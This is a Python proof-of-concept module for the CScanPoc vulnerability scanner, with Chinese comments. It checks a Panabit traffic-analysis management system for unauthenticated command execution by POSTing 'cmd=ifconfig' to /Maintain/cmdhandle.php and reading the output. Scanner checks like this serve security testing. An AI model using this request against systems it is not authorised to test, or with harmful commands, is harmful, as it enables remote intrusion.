# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'Panabit_0002'  # 平台漏洞编号，留空
    name = '派网软件某流量分析管理系统 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        派网软件（Panabit）某流量分析管理系统命令执行漏洞。
        /Maintain/cmdhandle.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '派网软件'  # 漏洞应用名称
    product_version = '派网软件某流量分析管理系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '944432a4-8032-497e-b188-88d90cba797f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/Maintain/cmdhandle.php'
            postdata = "cmd=ifconfig"
            code, head, res, errcode, _ = hh.http(url, post=postdata)

            if code == 200 and 'netmask' in res and 'broadcast' in res and 'inet' in res:
                # security_hole("Panabit某流量分析管理系统命令执行：post:cmd=命令")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
